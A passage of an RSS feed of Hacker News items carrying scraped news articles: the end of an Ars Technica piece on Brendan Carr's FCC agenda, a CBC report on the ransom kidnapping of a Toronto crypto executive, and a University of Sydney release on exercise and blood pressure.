<p>On Big Tech, Carr wants to implement Trump's 2020 plan to crack down on social media websites for alleged anti-conservative bias. At the time, Trump <a href="https://arstechnica.com/tech-policy/2020/07/trumps-social-media-crackdown-called-a-monumental-waste-of-fccs-time/">formally petitioned the FCC</a> to reinterpret Section 230 of the Communications Decency Act in a way that would limit social media platforms' legal protections for hosting third-party content when the platforms take down content they consider objectionable.</p>
<p>Trump was so keen on getting this done in 2020 that he <a href="https://arstechnica.com/tech-policy/2020/08/trump-pulls-re-nomination-of-fcc-republican-who-stood-up-for-first-amendment/">withdrew his re-nomination</a> of then-Commissioner Michael O'Rielly, a Republican who took the party line on most issues but did not support Trump's attempt to punish social networks. Trump and the Senate <a href="https://arstechnica.com/tech-policy/2020/09/trump-replaces-fcc-member-in-bid-to-push-through-twitter-facebook-crackdown/">replaced O'Rielly with Nathan Simington</a>, who was a member of the Trump administration before <a href="https://arstechnica.com/tech-policy/2020/12/senate-confirms-trump-fcc-nominee-cementing-2-2-deadlock-for-biden-admin/">becoming an FCC commissioner</a> just before Trump's first term ended. Simington is another possible chairman and has similar views as Carr, but Carr has a longer tenure on the FCC and has sought the media spotlight more than Simington.</p>
<p>In the Project 2025 publication, Carr's "reining in Big Tech" section said the FCC "should issue an order that interprets Section 230 in a way that eliminates the expansive, non-textual immunities that courts have read into the statute."</p>
<p>"The FCC has an important role to play in addressing the threats to individual liberty posed by corporations that are abusing dominant positions in the market. Nowhere is that clearer than when it comes to Big Tech and its attempts to drive diverse political viewpoints from the digital town square," Carr wrote.</p>

<h2>First Amendment</h2>
<p>Lewis said Public Knowledge is worried that changes to Section 230 would harm the ability of online platforms to moderate content or choose not to moderate content, because companies could face great legal liability for those choices if 230 is weakened or scrapped.</p>
<p>O'Rielly argued in a July 2020 <a href="https://docs.fcc.gov/public/attachments/DOC-365814A1.pdf">speech</a> that apparently angered Trump that the FCC shouldn't regulate in this area. "The First Amendment protects us from limits on speech imposed by the government—not private actors—and we should all reject demands, in the name of the First Amendment, for private actors to curate or publish speech in a certain way," O'Rielly said at the time. "Like it or not, the First Amendment's protections apply to corporate entities, especially when they engage in editorial decision making."</p>

          
                  </div>
                    
        
          
    
    <div>
          
          
<p>Carr claimed in his Project 2025 chapter that "the FCC has authority to take this action because Section 230 is codified in the Communications Act," and he pointed to Supreme Court Justice Clarence Thomas' <a href="https://arstechnica.com/tech-policy/2021/04/clarence-thomas-blasts-section-230-wants-common-carrier-rules-on-twitter/">views on the law</a> as evidence that the FCC can act.</p>
<p>Carr's chapter also said the FCC should "address TikTok's threat to US national security," saying the Chinese-owned social network "provides Beijing with an opportunity to run a foreign influence campaign by determining the news and information that the app feeds to millions of Americans."</p>
<h2>Carr’s Kamala Harris complaint</h2>
<p>On November 2, Carr claimed that NBC was trying to evade the Equal Time rule by putting Democratic nominee Kamala Harris on <em>Saturday Night Live</em>. "The purpose of the rule is to avoid exactly this type of biased and partisan conduct—a licensed broadcaster using the public airwaves to exert its influence for one candidate on the eve of an election. Unless the broadcaster offered Equal Time to other qualifying campaigns," Carr wrote.</p>
<p>Carr later <a href="https://www.foxnews.com/politics/fcc-commissioner-rips-nbc-over-harris-last-minute-snl-appearance-plainly-designed-evade-rules">told Fox News</a> that "all remedies should be on the table," including "license revocations."</p>
<p>"One commissioner standing alone, there's no real consequence that I can impose at this point," he said. "You need the FCC chairperson or at least three commissioners on the FCC to agree to take action. We'll see if we end up there with this commission or otherwise."</p>
<p>Carr was wrong about the Equal Time rule, <a href="https://www.freepress.net/news/press-releases/fccs-carr-wrongly-claims-snl-appearance-violates-agencys-equal-time-rules">media advocacy group Free Press said</a> on November 3. The group pointed to an <a href="https://www.fcc.gov/sites/default/files/political_programming_fact_sheet.pdf">FCC fact sheet</a> that says the rule "does not require a station to provide opposing candidates with programs identical to the initiating candidate."</p>
<p>"Despite Carr's claim, there is no evidence that the network was trying to avoid the rules," Free Press said. "Broadcasters have no legal obligation to set aside broadcast time for opposing candidates, unless the candidates request it. Equal-opportunity requests are commonplace in the final days of a national election, and broadcasters typically honor them."</p>

          
                  </div>
                    
        
          
    
    <div>
          
          
<p>NBC did <a href="https://www.latimes.com/entertainment-arts/business/story/2024-11-04/trump-campaign-gets-equal-time-from-nbc-after-harris-snl-appearance">honor a request</a> for equal time from the Trump campaign, giving him two free 60-second messages during NASCAR and NFL coverage.</p>
<h2>“Carr is desperate to become the FCC chair”</h2>
<p>Free Press co-CEO Jessica González said, "It's bizarre that a sitting FCC commissioner would engage in such a blatant and wrongheaded attempt to curry favor with a presidential candidate. But this is just the sort of reckless behavior we've come to expect from Brendan Carr. You'd expect an FCC commissioner to be familiar with his own agency's regulations. Instead Carr seems willing to concoct falsehoods if it means he'll get noticed by the former president."</p>
<p>González added, "It's no secret around Washington that Carr is desperate to become the FCC chair should Trump be elected president. First Carr wrote a chapter in the widely discredited policy platform for Project 2025, a far-right master plan to disassemble US democracy. Now he's making grossly inaccurate claims about communications law to win points with the former president."</p>
<p>Carr continued claiming that NBC violated the rule even after Trump was given free TV time. "NBC and SNL decided to bring just one candidate on less than 50 hours before Election Day," he <a href="https://x.com/BrendanCarrFCC/status/1854223937271398787">wrote on November 6</a>. "The FCC has previously addressed these types of 'last minute' situations. I encourage any candidate that does not believe that their Equal Time rights were honored to bring the issue forward to the FCC for our adjudication."</p>

<h2>Making Big Tech pay</h2>
<p>Carr wants to help Internet service providers achieve a <a href="https://arstechnica.com/tech-policy/2024/06/isps-ask-fcc-for-tax-on-big-tech-to-fund-broadband-networks-and-discounts/">long-held dream</a> of making tech companies pay for broadband network upgrades. Carr's Project 2025 chapter said the FCC should "require that Big Tech begin to contribute a fair share" into "the FCC's roughly $9 billion Universal Service Fund."</p>

          
                  </div>
                    
        
          
    
    <div>
          
          
<p>The fund has long been paid for by telecom companies, which generally pass the cost on to consumers on their telephone bills. "While Big Tech derives tremendous value from the federal government's universal service investments—using those federally supported networks to deliver their products and realize significant profits—these large corporations have avoided paying a fair share into the program," Carr wrote.</p>
<p>The Biden administration <a href="https://arstechnica.com/tech-policy/2023/05/biden-admin-wants-europe-to-reject-forced-payments-from-big-tech-to-isps/">urged Europe</a> to reject a similar idea last year, saying that payments from online platforms to ISPs would "distort competition" and undermine net neutrality. The European plan was also criticized by <a href="https://arstechnica.com/tech-policy/2023/03/meta-slams-telco-fee-proposal-says-isps-should-pay-their-own-network-costs/">Meta</a>, <a href="https://arstechnica.com/tech-policy/2022/09/google-fights-latest-attempt-to-have-big-tech-pay-for-isps-network-upgrades/">Google</a>, <a href="https://arstechnica.com/tech-policy/2023/03/netflix-fights-attempt-to-make-streaming-firms-pay-for-isp-network-upgrades/">Netflix</a>, and the Body of European Regulators for Electronic Communications (BEREC). The group of regulators from European countries <a href="https://www.berec.europa.eu/system/files/2023-05/BoR%20(23)%20131b%20Overview%20of%20BEREC%20Response%20to%20Exploratory%20Consultation.pdf">said</a> it found no evidence of "free-riding" by tech companies or evidence that ISPs' costs weren't fully covered.</p>
<p>If he becomes chair, Carr would have significant influence over which companies get money from the Universal Service Fund. Carr was angry about the FCC decision to <a href="https://arstechnica.com/tech-policy/2022/08/fcc-rejects-starlinks-886-million-grant-says-spacex-proposal-too-risky/">reject Starlink's application</a> to receive $885.51 million in broadband funding.</p>
<p>The grant was tentatively awarded during Pai's tenure but canceled in a 2022 ruling that called Starlink a "nascent LEO [low Earth orbit] satellite technology" with "recognized capacity constraints." The Biden-era FCC had earlier pointed out that Pai's system for choosing grant winners led to "complaints that the program was poised to fund broadband to parking lots and well-served urban areas."</p>
<p>When the FCC <a href="https://arstechnica.com/tech-policy/2023/12/spacex-blasts-fcc-as-it-refuses-to-reinstate-starlinks-886-million-grant/">rejected Starlink's appeal</a> in 2023, Carr said the FCC decision "certainly fits the Biden Administration's pattern of regulatory harassment."&nbsp;The FCC, Carr said, is one of a "growing list of administrative agencies that are taking action against Elon Musk's businesses." He alleged that "the Biden Administration is choosing to prioritize its political and ideological goals at the expense of connecting Americans."</p>

          
                  </div>
                    
        
          
    
    <div>

        
        <div>
          
          
<h2>Killing broadband regulation</h2>
<p>Carr also wants to help ISPs avoid regulation. A Carr-led FCC would likely drop the agency's <a href="https://arstechnica.com/tech-policy/2023/10/is-net-neutrality-doomed-at-supreme-court-fcc-and-isps-prepare-for-epic-battle/">legal defense of its net neutrality rules</a>, and that defense is <a href="https://arstechnica.com/tech-policy/2024/08/fcc-suffers-major-setback-in-attempt-to-defend-net-neutrality-rules/">off to a rocky start</a> in court already.</p>
<p>California and other states have been <a href="https://arstechnica.com/tech-policy/2024/04/fcc-wont-block-california-net-neutrality-law-says-states-can-experiment/">regulating net neutrality</a> themselves since the Pai FCC eliminated Obama-Era rules that prohibited paid prioritization and blocking or throttling of lawful traffic. The next FCC chair could try to revive Pai's attempt to preempt state laws, which was <a href="https://arstechnica.com/tech-policy/2019/10/why-ajit-pais-unhinged-net-neutrality-repeal-was-upheld-by-judges/">rejected in court</a> in 2019.</p>
<p>Carr would likely try to halt or unwind other initiatives that Democratic Chairwoman Jessica Rosenworcel has undertaken to help broadband consumers. Carr dissented last year in the FCC's <a href="https://arstechnica.com/tech-policy/2023/11/cable-lobby-and-ted-cruz-are-disappointed-as-fcc-bans-digital-discrimination/">3-2 decision to impose rules</a> that prohibit discrimination in access to broadband services. Carr described Rosenworcel's discrimination proposal as "President Biden's plan to give the administrative state effective control of all Internet services and infrastructure in the US," claiming it was "motivated by an ideology of government control that is not compatible with the fundamental precepts of free market capitalism."</p>
<p>Rosenworcel last month <a href="https://arstechnica.com/tech-policy/2024/10/fcc-republican-opposes-regulation-of-data-caps-with-analogy-to-coffee-refills/">announced a formal inquiry into data caps</a> to consider their effect on consumers and whether the FCC has authority to regulate them.&nbsp;In dissent, Carr <a href="https://docs.fcc.gov/public/attachments/FCC-24-106A3.pdf">said</a>, "I cannot support the Biden-Harris Administration's inexorable march towards rate regulation," and that "the FCC plainly does not have the legal authority" to regulate data caps.</p>
<p>He also said that data caps can be good for Internet users. "Prohibiting customers from choosing to purchase plans with data caps—which are more affordable than unlimited ones—necessarily regulates the service rates they are paying for," Carr said.</p>
<p>Lewis told Ars that ditching the data cap inquiry means that "we will miss out on opportunities to look at when a broadband provider preferences its own streaming service or other service over a competitor's. Ending the data caps probe will mean we will not be able to look at those sorts of specific cases and see if there is an anticompetitive practice."</p>


          
                  </div>

                  
          






  <div>
  <div>
          <p><a href="https://arstechnica.com/author/jon-brodkin/"><img src="https://arstechnica.com/wp-content/uploads/2016/05/j.brodkin-11_2.jpg" alt="Photo of Jon Brodkin"></a></p>
  </div>

  <div>
    

    <p>
      Jon is a Senior IT Reporter for Ars Technica. He covers the telecom industry, Federal Communications Commission rulemakings, broadband consumer affairs, court cases, and government regulation of the tech industry.
    </p>
  </div>
</div>


  <p>
    <a href="https://arstechnica.com/tech-policy/2024/11/trumps-likely-fcc-chair-wrote-project-2025-chapter-on-how-hed-run-the-agency/#comments" title="194 comments">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 80"><defs><clipPath id="bubble-zero_svg__a"><path fill="none" stroke-width="0" d="M0 0h80v80H0z"></path></clipPath><clipPath id="bubble-zero_svg__b"><path fill="none" stroke-width="0" d="M0 0h80v80H0z"></path></clipPath></defs><g clip-path="url(#bubble-zero_svg__a)"><g fill="currentColor" clip-path="url(#bubble-zero_svg__b)"><path d="M80 40c0 22.09-17.91 40-40 40S0 62.09 0 40 17.91 0 40 0s40 17.91 40 40"></path><path d="M40 40 .59 76.58C-.67 77.84.22 80 2.01 80H40z"></path></g></g></svg>
    194 Comments
  </a>
      </p>





  
              </div>
  </article>


  <div>
    <header>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 26"><defs><clipPath id="most-read_svg__a"><path fill="none" d="M0 0h40v26H0z"></path></clipPath><clipPath id="most-read_svg__b"><path fill="none" d="M0 0h40v26H0z"></path></clipPath></defs><g clip-path="url(#most-read_svg__a)"><g fill="none" clip-path="url(#most-read_svg__b)"><path fill="currentColor" d="M20 2h.8q1.5 0 3 .6c.6.2 1.1.4 1.7.6 1.3.5 2.6 1.3 3.9 2.1.6.4 1.2.8 1.8 1.3 2.9 2.3 5.1 4.9 6.3 6.4-1.1 1.5-3.4 4-6.3 6.4-.6.5-1.2.9-1.8 1.3q-1.95 1.35-3.9 2.1c-.6.2-1.1.4-1.7.6q-1.5.45-3 .6h-1.6q-1.5 0-3-.6c-.6-.2-1.1-.4-1.7-.6-1.3-.5-2.6-1.3-3.9-2.1-.6-.4-1.2-.8-1.8-1.3-2.9-2.3-5.1-4.9-6.3-6.4 1.1-1.5 3.4-4 6.3-6.4.6-.5 1.2-.9 1.8-1.3q1.95-1.35 3.9-2.1c.6-.2 1.1-.4 1.7-.6q1.5-.45 3-.6zm0-2h-1c-1.2 0-2.3.3-3.4.6-.6.2-1.3.4-1.9.7-1.5.6-2.9 1.4-4.3 2.3-.7.5-1.3.9-1.9 1.4C2.9 8.7 0 13 0 13s2.9 4.3 7.5 7.9c.6.5 1.3 1 1.9 1.4 1.3.9 2.7 1.7 4.3 2.3.6.3 1.3.5 1.9.7 1.1.3 2.3.6 3.4.6h2c1.2 0 2.3-.3 3.4-.6.6-.2 1.3-.4 1.9-.7 1.5-.6 2.9-1.4 4.3-2.3.7-.5 1.3-.9 1.9-1.4C37.1 17.3 40 13 40 13s-2.9-4.3-7.5-7.9c-.6-.5-1.3-1-1.9-1.4-1.3-.9-2.8-1.7-4.3-2.3-.6-.3-1.3-.5-1.9-.7C23.3.4 22.1.1 21 .1h-1"></path><path fill="#ff4e00" d="M20 5c-4.4 0-8 3.6-8 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8m0 11c-1.7 0-3-1.3-3-3s1.3-3 3-3 3 1.3 3 3-1.3 3-3 3"></path></g></g></svg>
      
    </header>
    <ol>
              <li>
                      <a href="https://arstechnica.com/ai/2024/11/trump-victory-signals-major-shakeup-for-us-ai-regulations/">
              <img src="https://cdn.arstechnica.net/wp-content/uploads/2024/11/trump_speech_2024-768x432.jpg" alt="Listing image for first story in Most Read: Trump plans to dismantle Biden AI safeguards after victory" decoding="async" loading="lazy">
            </a>
                    
        </li>
                    <li>
                    
        </li>
                    <li>
                    
        </li>
                    <li>
                    
        </li>
                    <li>
                    
        </li>
                  </ol>
</div>


  

  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Toronto crypto company CEO kidnapped, held for $1M ransom before being released (181 pts)]]></title>
            <link>https://www.cbc.ca/news/canada/toronto/kidnapping-toronto-businessman-cryptocurrency-1.7376679</link>
            <guid>42080821</guid>
            <pubDate>Thu, 07 Nov 2024 20:48:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cbc.ca/news/canada/toronto/kidnapping-toronto-businessman-cryptocurrency-1.7376679">https://www.cbc.ca/news/canada/toronto/kidnapping-toronto-businessman-cryptocurrency-1.7376679</a>, See on <a href="https://news.ycombinator.com/item?id=42080821">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="detailContent"><!--$--><p><span><a href="https://www.cbc.ca/news/canada/toronto"><span>Toronto</span></a></span></p><!--/$--><p>The head of a company specializing in cryptocurrency was kidnapped and held for ransom in downtown Toronto during rush hour Wednesday.&nbsp;</p><h2 lang="en">Incident happened in downtown Toronto just before 6 p.m. Wednesday </h2><!--$--><!--/$--><!--$--><div data-cy="storyWrapper"><!--$--><p><span><span><div title="Toronto crypto company CEO kidnapped, held for $1M ransom before release" role="button" tabindex="0" data-cy="player-placeholder-ui-container"><div><p><img src="https://i.cbc.ca/ais/e8031336-586c-422e-9790-4e0c19dbd9d5,1731021735125/full/max/0/default.jpg?im=Crop%2Crect%3D%280%2C0%2C1279%2C719%29%3BResize%3D%28620%29" srcset="" alt=""></p></div><div><p>Toronto crypto company CEO kidnapped, held for $1M ransom before release</p></div></div><span>The CEO of a Toronto company specializing in cryptocurrency was kidnapped and held for a $1 million ransom Wednesday, police say. CBC’s Chris Glover has the latest.</span></span></span></p><!--/$--><div><p dir="ltr">The head of a company specializing in cryptocurrency was kidnapped and held for ransom in downtown Toronto during rush hour Wednesday.&nbsp;</p><p dir="ltr">Police were called about a kidnapping in the area of University Avenue and Richmond Street W.&nbsp;just before 6 p.m., says a spokesperson with the Toronto Police Service.&nbsp;</p><p dir="ltr">The suspects forced the victim into a vehicle and made a demand for money, the spokesperson said.&nbsp;</p><p dir="ltr">The man was later located in Centennial Park in Etobicoke uninjured.</p><p dir="ltr">CBC&nbsp;Toronto has learned&nbsp;the victim is&nbsp;Dean Skurka,&nbsp;the president and CEO of Toronto-based financial firm <a href="https://www.wonder.fi/#Executive-Team">WonderFi.</a> He was released after a ransom of $1 million was paid electronically, a source close to the investigation said.&nbsp;</p><p dir="ltr">Skurka&nbsp;told CBC Toronto&nbsp;via email on Thursday that&nbsp;he had been&nbsp;involved in an "incident" Wednesday but is safe.</p><p dir="ltr">"The safety and security of all of WonderFi's employees are paramount," Skurka&nbsp;said in the email.&nbsp; "Client funds and data remain safe, and were not impacted by this incident."</p><div dir="ltr"><figure><p><img loading="lazy" alt="A headshot of a man with dark hair who is smiling " srcset="https://i.cbc.ca/1.7376792.1731022459!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/dean-skurka.jpg 300w,https://i.cbc.ca/1.7376792.1731022459!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/dean-skurka.jpg 460w,https://i.cbc.ca/1.7376792.1731022459!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/dean-skurka.jpg 620w,https://i.cbc.ca/1.7376792.1731022459!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/dean-skurka.jpg 780w,https://i.cbc.ca/1.7376792.1731022459!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/dean-skurka.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.7376792.1731022459!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/dean-skurka.jpg" data-cy="image-img"></p><figcaption>Dean Skurka is the president and CEO of WonderFi, a Toronto-based cryptocurrency firm. <!-- --> <!-- -->(LinkedIn)</figcaption></figure></div><p dir="ltr">Police say the investigation is ongoing and have not released any further details.&nbsp;</p><h2 dir="ltr">&nbsp;Cryptocurrency ripe target for theft: expert&nbsp;&nbsp;</h2><p dir="ltr">Jameson Lopp, the co-founder and chief security officer of Casa, a security firm focused on protecting cryptocurrency users, has been keeping track of physical thefts designed to steal cryptocurrency for around a decade.</p><p dir="ltr">He&nbsp;says Skurka's abduction&nbsp;is the 171st instance of suspects&nbsp;using physical violence to steal bitcoins, that&nbsp;he's aware of.</p><p dir="ltr">The rates of these kind of incidents tends to correlate&nbsp;with the exchange rate of bitcoin, he said.&nbsp;</p><p dir="ltr">"As the price goes up, more awareness of the space permeates throughout society and as a result, more criminally minded people decide they want to try to figure out what the ROI of executing a physical attack against a known crypto holder is."</p><p dir="ltr">The price of bitcoin <a href="https://www.cbc.ca/news/business/bitcoin-trump-jump-1.7375243">hit a new high Wednesday</a>, climbing above $75,000 US and smashing its previous record set in March.&nbsp;</p><p dir="ltr">The nature of cryptocurrency can make physical thefts and/or extortion of users more appealing to criminals versus other types of theft like robbing a bank, Lopp said.&nbsp;</p><div dir="ltr"><ul><li><a href="https://www.cbc.ca/news/canada/toronto/crypto-king-pleterski-kidnapped-1.6790615" text="Ontario's self-proclaimed Crypto King kidnapped, beaten for ransom, bankruptcy documents claim" flag="" data-contentid=""><span>Ontario's self-proclaimed Crypto King kidnapped, beaten for ransom, bankruptcy documents claim</span></a></li></ul><ul><li><a href="https://www.cbc.ca/news/canada/toronto/investor-lost-money-among-5-men-charged-kidnapping-ontario-crypto-king-1.6907548" text="Investor who lost $740K to Ontario's Crypto King among 5 men charged with kidnapping him" flag="CBC Investigates" data-contentid=""><p><span>CBC Investigates</span></p><span>Investor who lost $740K to Ontario's Crypto King among 5 men charged with kidnapping him</span></a></li></ul></div><p dir="ltr">"They [cryptocurrencies] are incredibly easy to transport, incredibly easy to take possession of from someone in comparison to a bank or an armoured truck," he said.&nbsp;</p><p dir="ltr">"The average crypto person, even early adopters who may be multi-millionaires, tend not to have really great physical security, and often they don't have great operational security or privacy."</p><p dir="ltr">The victims in the majority of these crimes are average citizens, he said.&nbsp;</p><p dir="ltr">"This particular incident is not something that many people have to worry about unless they're a high profile figure," Lopp&nbsp;said.&nbsp;</p><p dir="ltr">"But you know, what I see in the space, is even a lot of high profile figures, I would say, do not have the level of security and privacy that they should to be commensurate with their risk profile."</p><p dir="ltr">The alleged kidnapping happened the same day WonderFi released its third quarter earnings results, showing a 153 per cent increase compared to its third quarter in 2023.</p></div></div><!--/$--><!--$--><!--/$--><div><h2>ABOUT THE AUTHOR</h2><div><figure><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.4882572.1564596942!/fileImage/httpImage/image.jpg_gen/derivatives/square_1180/sarah-petz.jpg?im=Resize%3D620 300w,https://i.cbc.ca/1.4882572.1564596942!/fileImage/httpImage/image.jpg_gen/derivatives/square_1180/sarah-petz.jpg?im=Resize%3D620 460w,https://i.cbc.ca/1.4882572.1564596942!/fileImage/httpImage/image.jpg_gen/derivatives/square_1180/sarah-petz.jpg?im=Resize%3D620 620w" sizes="(max-width: 258pxpx) 258pxpx" src="https://i.cbc.ca/1.4882572.1564596942!/fileImage/httpImage/image.jpg_gen/derivatives/square_1180/sarah-petz.jpg?im=Resize%3D620" data-cy="author-image-img"></p></figure></div><p>Sarah Petz is a reporter with CBC Manitoba. She was previously based at CBC New Brunswick. Her career has taken her across three provinces and includes a stint in East Africa. She can be reached at Sarah.Petz@cbc.ca or @sarahrosepetz on Twitter. </p><ul></ul></div><p>With files from Chris Glover, John Lancaster and Associate Press </p><!--$--><!--/$--><!--$--><!--/$--></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Five minutes of exercise a day could lower blood pressure (242 pts)]]></title>
            <link>https://www.sydney.edu.au/news-opinion/news/2024/11/07/five-minutes-of-exercise-a-day-could-lower-blood-pressure.html</link>
            <guid>42080747</guid>
            <pubDate>Thu, 07 Nov 2024 20:42:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.sydney.edu.au/news-opinion/news/2024/11/07/five-minutes-of-exercise-a-day-could-lower-blood-pressure.html">https://www.sydney.edu.au/news-opinion/news/2024/11/07/five-minutes-of-exercise-a-day-could-lower-blood-pressure.html</a>, See on <a href="https://news.ycombinator.com/item?id=42080747">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		
		
			<p>New research suggests that adding a small amount of physical activity – such as uphill walking or stair-climbing – into your day may help to lower blood pressure.</p>
<p>The study, published in Circulation, was carried out by experts from the <a href="https://www.propassconsortium.org/">ProPASS (Prospective Physical Activity, Sitting and Sleep) Consortium</a>, an international academic collaboration led by the University of Sydney and <a href="https://www.ucl.ac.uk/">University College London</a> (UCL).&nbsp;</p>
<p>Just five minutes of activity a day was estimated to potentially reduce blood pressure, while replacing sedentary behaviours with 20-27 minutes of exercise per day, including uphill walking, stair-climbing, running and cycling, was also estimated to lead to a clinically meaningful reduction in blood pressure.</p>
<p>Joint senior author <a href="https://www.sydney.edu.au/medicine-health/about/our-people/academic-staff/emmanuel-stamatakis.html">Professor Emmanuel Stamatakis,</a> Director of the ProPASS Consortium from the <a href="https://www.sydney.edu.au/charles-perkins-centre/">Charles Perkins Centre</a> said: “High blood pressure is one of the biggest health issues globally, but unlike some major causes of cardiovascular mortality there may be relatively accessible ways to tackle the problem in addition to medication.”</p>
<p>“The finding that doing as little as five extra minutes of exercise per day could be associated with measurably lower blood pressure readings emphasises how powerful short bouts of higher intensity movement could be for blood pressure management.”</p>
<p>Hypertension, or a consistent elevated blood pressure level, is one of the biggest causes of premature death globally. Affecting 1.28 billion adults around the world, it can lead to stroke, heart attack, heart failure, kidney damage and many other health problems, and is often described as the ‘silent killer’ due to its lack of symptoms.</p>
<p>The research team analysed health data from 14,761 volunteers in five countries to see how replacing one type of movement behaviour with another across the day is associated with blood pressure.</p>
<p>Each participant used a wearable accelerometer device on their thigh to measure their activity and blood pressure throughout the day and night.&nbsp;</p>
<p>Daily activity was split into six categories: sleep, sedentary behaviour (such as sitting), slow walking, fast walking, standing, and more vigorous exercise such as running, cycling or stair climbing.</p>
<p>The team modelled statistically what would happen if an individual changed various amounts of one behaviour for another in order to estimate the effect on blood pressure for each scenario and found that replacing sedentary behaviour with 20-27 minutes of exercise per day could potentially reduce cardiovascular disease by up to 28 percent at a population level.</p>
<p>First author <a href="https://profiles.ucl.ac.uk/58333-jo-blodgett">Dr Jo Blodgett</a> from the <a href="https://www.ucl.ac.uk/surgery/">Division of Surgery and Interventional Science</a> at UCL and the <a href="https://www.iseh.co.uk/">Institute of Sport, Exercise and Health</a> said: “Our findings suggest that, for most people, exercise is key to reducing blood pressure, rather than less strenuous forms of movement such as walking.</p>
<p>“The good news is that whatever your physical ability, it doesn’t take long to have a positive effect on blood pressure. What’s unique about our exercise variable is that it includes all exercise-like activities, from running for a bus or a short cycling errand, many of which can be integrated into daily routines.</p>
<p>“For those who don’t do a lot of exercise, walking did still have some positive benefits for blood pressure. But if you want to change your blood pressure, putting more demand on the cardiovascular system through exercise will have the greatest effect.”</p>
<p>Professor Mark Hamer, joint senior author of the study and ProPASS Deputy Director from UCL, said: “Our findings show how powerful research platforms like the ProPASS consortium are for identifying relatively subtle patterns of exercise, sleep, and sedentary behaviour, that have&nbsp; significant clinical and public health importance.”</p>

		
		
	</div><div>
		
		
			<p>Blodgett, J., Stamatakis, E., Hamer, M., et al, ‘Device-measured 24-hour movement behaviours and blood pressure: a six-part compositional individual participant data analysis in the ProPASS Consortium’ (Circulation, 2024)</p>
<p>DOI: 10.1161/CIRCULATIONAHA.124.069820&nbsp;</p>

		
		
	</div><div>
		
		
			<p>Professor Emmanuel Stamatakis is a paid consultant and holds equity in Complement Theory Inc, a US-based startup whose products and services relate to the contents of this article. All other authors declare no competing interests.</p>

		
		
	</div><div>
		
		
			<p><strong>Hero Media Credit: Adobe Stock&nbsp;</strong></p>

		
		
	</div></div>]]></description>
        </item>
    </channel>
</rss>